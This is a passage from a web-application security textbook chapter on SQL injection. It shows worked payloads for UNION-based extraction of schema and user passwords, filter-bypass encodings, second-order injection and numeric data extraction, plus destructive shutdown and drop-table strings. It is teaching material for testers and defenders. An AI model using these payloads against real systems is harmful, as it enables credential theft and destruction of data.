string of the database, which can be done on any DBMS. For example, if there
are three columns, and the fi rst column can take string data, you can extract
the database version by injecting the following query on MS-SQL and MySQL:
‘ UNION SELECT @@version,NULL,NULL--
Injecting the following query achieves the same result on Oracle:
‘ UNION SELECT banner,NULL,NULL FROM v$version--
In the example of the vulnerable book search application, we can use this
string as a search term to retrieve the version of the Oracle database:
cc0099..iinndddd 330077 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 308
308 Chapter 9 n Attacking Data Stores
AUTHOR TITLE YEAR
CORE 9.2.0.1.0 Production
NLSRTL Version 9.2.0.1.0 - Production
Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
PL/SQL Release 9.2.0.1.0 - Production
TNS for 32-bit Windows: Version 9.2.0.1.0 - Production
Of course, even though the database’s version string may be interesting, and
may enable you to research vulnerabilities with the specifi c software being used,
in most cases you will be more interested in extracting actual data from the
database. To do this, you typically need to address the second proviso described
earlier. That is, you need to know the name of the database table you want to
target and the names of its relevant columns.
Extracting Useful Data
To extract useful data from the database, normally you need to know the names
of the tables and columns containing the data you want to access. The main
enterprise DBMSs contain a rich amount of database metadata that you can
query to discover the names of every table and column within the database.
The methodology for extracting useful data is the same in each case; however,
the details differ on different database platforms.
Extracting Data with UNION
Let’s look at an attack being performed against an MS-SQL database, but use a
methodology that will work on all database technologies. Consider an address
book application that allows users to maintain a list of contacts and query and
update their details. When a user searches her address book for a contact named
Matthew, her browser posts the following parameter:
Name=Matthew
and the application returns the following results:
NAME E-MAIL
Matthew Adamson PI:EMAIL
cc0099..iinndddd 330088 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 309
Chapter 9 n Attacking Data Stores 309
TRY IT!
http://mdsec.net/addressbook/32/
First, we need to determine the required number of columns. Testing for a
single column results in an error message:
Name=Matthew’%20union%20select%20null--
All queries combined using a UNION, INTERSECT or EXCEPT operator must
have an equal number of expressions in their target lists.
We add a second NULL, and the same error occurs. So we continue adding NULLs
until our query is executed, generating an additional item in the results table:
Name=Matthew’%20union%20select%20null,null,null,null,null--
NAME E-MAIL
Matthew Adamson PI:EMAIL
[empty] [empty]
We now verify that the fi rst column in the query contains string data:
Name=Matthew’%20union%20select%20’a’,null,null,null,null--
NAME E-MAIL
Matthew Adamson PI:EMAIL
a
The next step is to fi nd out the names of the database tables and columns that
may contain interesting information. We can do this by querying the metadata
table information_schema.columns, which contains details of all tables and
column names within the database. These can be retrieved with this query:
Name=Matthew’%20union%20select%20table_name,column_name,null,null,
null%20from%20information_schema.columns--
cc0099..iinndddd 330099 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 310
310 Chapter 9 n Attacking Data Stores
NAME E-MAIL
Matthew Adamson PI:EMAIL
shop_items price
shop_items prodid
shop_items prodname
addr_book contactemail
addr_book contactname
users username
users password
Here, the users table is an obvious place to begin extracting data. We could
extract data from the users table using this query:
Name=Matthew’%20UNION%20select%20username,password,null,null,null%20
from%20users--
NAME E-MAIL
Matthew Adamson PI:EMAIL
administrator fme69
dev uber
marcus 8pinto
smith twosixty
jlo 6kdown
TIP The information_schema is supported by MS-SQL, MySQL, and many
other databases, including SQLite and Postgresql. It is designed to hold data-
base metadata, making it a primary target for attackers wanting to examine
the database. Note that Oracle doesn’t support this schema. When targeting
an Oracle database, the attack would be identical in every other way. However,
you would use the query SELECT table_name,column_name FROM all_tab_
columns to retrieve information about tables and columns in the database.
(You would use the user_tab_columns table to focus on the current database
only.) When analyzing large databases for points of attack, it is usually best to
look directly for interesting column names rather than tables. For instance:
SELECT table_name,column_name FROM information_schema.columns where
column_name LIKE ‘%PASS%’
cc0099..iinndddd 331100 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 311
Chapter 9 n Attacking Data Stores 311
TIP When multiple columns are returned from a target table, these can be
concatenated into a single column. This makes retrieval more straightforward,
because it requires identifi cation of only a single varchar fi eld in the original
query:
n Oracle:SELECT table_name||’:’||column_name FROM
all_tab_columns
n MS-SQL:SELECT table_name+’:’+column_name from information_
schema.columns
n MySQL:SELECT CONCAT(table_name,’:’,column_name) from
information_schema.columns
Bypassing Filters
In some situations, an application that is vulnerable to SQL injection may imple-
ment various input fi lters that prevent you from exploiting the fl aw without
restrictions. For example, the application may remove or sanitize certain characters
or may block common SQL keywords. Filters of this kind are often vulnerable
to bypasses, so you should try numerous tricks in this situation.
Avoiding Blocked Characters
If the application removes or encodes some characters that are often used in
SQL injection attacks, you may still be able to perform an attack without these:
n The single quotation mark is not required if you are injecting into a numeric
data fi eld or column name. If you need to introduce a string into your
attack payload, you can do this without needing quotes. You can use
various string functions to dynamically construct a string using the ASCII
codes for individual characters. For example, the following two queries
for Oracle and MS-SQL, respectively, are the equivalent of select ename,
sal from emp where ename=’marcus’:
SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||
CHR(114)||CHR(99)||CHR(117)||CHR(115)
SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)
+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
n If the comment symbol is blocked, you can often craft your injected data
such that it does not break the syntax of the surrounding query, even
without using this. For example, instead of injecting:
‘ or 1=1--
you can inject:
‘ or ‘a’=’a
cc0099..iinndddd 331111 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 312
312 Chapter 9 n Attacking Data Stores
n When attempting to inject batched queries into an MS-SQL database,
you do not need to use the semicolon separator. Provided that you fi x
the syntax of all queries in the batch, the query parser will interpret them
correctly, whether or not you include a semicolon.
TRY IT!
http://mdsec.net/addressbook/71/
http://mdsec.net/addressbook/76/
Circumventing Simple Validation
Some input validation routines employ a simple blacklist and either block or
remove any supplied data that appears on this list. In this instance, you should
try the standard attacks, looking for common defects in validation and canoni-
calization mechanisms, as described in Chapter 2. For example, if the SELECT
keyword is being blocked or removed, you can try the following bypasses:
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
TRY IT!
http://mdsec.net/addressbook/58/
http://mdsec.net/addressbook/62/
Using SQL Comments
You can insert inline comments into SQL statements in the same way as for C++,
by embedding them between the symbols /* and */. If the application blocks
or strips spaces from your input, you can use comments to simulate whitespace
within your injected data. For example:
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
In MySQL, comments can even be inserted within keywords themselves,
which provides another means of bypassing some input validation fi lters while
preserving the syntax of the actual query. For example:
SEL/*foo*/ECT username,password FR/*foo*/OM users
cc0099..iinndddd 331122 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 313
Chapter 9 n Attacking Data Stores 313
Exploiting Defective Filters
Input validation routines often contain logic fl aws that you can exploit to smuggle
blocked input past the fi lter. These attacks often exploit the ordering of multiple
validation steps, or the failure to apply sanitization logic recursively. Some
attacks of this kind are described in Chapter 11.
TRY IT!
http://mdsec.net/addressbook/67/
Second-Order SQL Injection
A particularly interesting type of fi lter bypass arises in connection with second-
order SQL injection. Many applications handle data safely when it is fi rst inserted
into the database. Once data is stored in the database, it may later be processed
in unsafe ways, either by the application itself or by other back-end processes.
Many of these are not of the same quality as the primary Internet-facing appli-
cation but have high-privileged database accounts.
In some applications, input from the user is validated on arrival by escaping
a single quote. In the original book search example, this approach appears to
be effective. When the user enters the search term O’Reilly, the application
makes the following query:
SELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’
Here, the single quotation mark supplied by the user has been converted into
two single quotation marks. Therefore, the item passed to the database has the
same literal signifi cance as the original expression the user entered.
One problem with the doubling-up approach arises in more complex situa-
tions where the same item of data passes through several SQL queries, being
written to the database and then read back more than once. This is one example
of the shortcomings of simple inputvalidation as opposed to boundaryvalidation,
as described in Chapter 2.
Recall the application that allowed users to self-register and contained a SQL
injection fl aw in an INSERT statement. Suppose that developers attempt to fi x
the vulnerability by doubling up any single quotation marks that appear within
user data. Attempting to register the username foo’ results in the following
query, which causes no problems for the database:
INSERT INTO users (username, password, ID, privs) VALUES (‘foo’’’,
‘secret’, 2248, 1)
cc0099..iinndddd 331133 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 314
314 Chapter 9 n Attacking Data Stores
So far, so good. However, suppose that the application also implements a
password change function. This function is reachable only by authenticated
users, but for extra protection, the application requires users to submit their
old password. It then verifi es that this is correct by retrieving the user’s cur-
rent password from the database and comparing the two strings. To do this, it
fi rst retrieves the user’s username from the database and then constructs the
following query:
SELECT password FROM users WHERE username = ‘foo’’
Because the username stored in the database is the literal string foo’, this
is the value that the database returns when this value is queried. The doubled-
up escape sequence is used only at the point where strings are passed into the
database. Therefore, when the application reuses this string and embeds it into
a second query, a SQL injection fl aw arises, and the user’s original bad input is
embedded directly into the query. When the user attempts to change the pass-
word, the application returns the following message, which reveals the fl aw:
Unclosed quotation mark before the character string ‘foo
To exploit this vulnerability, an attacker can simply register a username
containing his crafted input, and then attempt to change his password. For
example, if the following username is registered:
‘ or 1 in (select password from users where username=’admin’)--
the registration step itself will be handled securely. When the attacker tries to
change his password, his injected query will be executed, resulting in the fol-
lowing message, which discloses the admin user’s password:
Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
the varchar value ‘fme69’ to a column of data type int.
The attacker has successfully bypassed the input validation that was designed
to block SQL injection attacks. Now he has a way to execute arbitrary queries
within the database and retrieve the results.
TRY IT!
http://mdsec.net/addressbook/107/
Advanced Exploitation
All the attacks described so far have had a ready means of retrieving any use-
ful data that was extracted from the database, such as by performing a UNION
attack or returning data in an error message. As awareness of SQL injection
cc0099..iinndddd 331144 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 315
Chapter 9 n Attacking Data Stores 315
threats has evolved, this kind of situation has become gradually less common.
It is increasingly the case that the SQL injection fl aws that you encounter will
be in situations where retrieving the results of your injected queries is not
straightforward. We will look at several ways in which this problem can arise,
and how you can deal with it.
NOTE Application owners should be aware that not every attacker is inter-
ested in stealing sensitive data. Some may be more destructive. For example,
by supplying just 12 characters of input, an attacker could turn off an MS-SQL
database with the shutdown command:
‘ shutdown--
An attacker could also inject malicious commands to drop individual tables
with commands such as these:
‘ drop table users--
‘ drop table accounts--
‘ drop table customers--
Retrieving Data as Numbers
It is fairly common to fi nd that no string fi elds within an application are vulner-
able to SQL injection, because input containing single quotation marks is being
handled properly. However, vulnerabilities may still exist within numeric data
fi elds, where user input is not encapsulated within single quotes. Often in these
situations, the only means of retrieving the results of your injected queries is
via a numeric response from the application.
In this situation, your challenge is to process the results of your injected
queries in such a way that meaningful data can be retrieved in numeric form.
Two key functions can be used here:
n ASCII, which returns the ASCII code for the input character
n SUBSTRING (or SUBSTR in Oracle), which returns a substring of its input
These functions can be used together to extract a single character from a
string in numeric form. For example:
SUBSTRING(‘Admin’,1,1) returns A.
ASCII(‘A’) returns 65.
Therefore:
ASCII(SUBSTR(‘Admin’,1,1)) returns 65.
Using these two functions, you can systematically cut a string of useful data
into its individual characters and return each of these separately, in numeric
form. In a scripted attack, this technique can be used to quickly retrieve and
reconstruct a large amount of string-based data one byte at a time.
cc0099..iinndddd 331155 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 316
316 Chapter 9 n Attacking Data Stores
TIP There are numerous subtle variations in how different database plat-
forms handle string manipulation and numeric computation, which you may
need to take into account when performing advanced attacks of this kind. An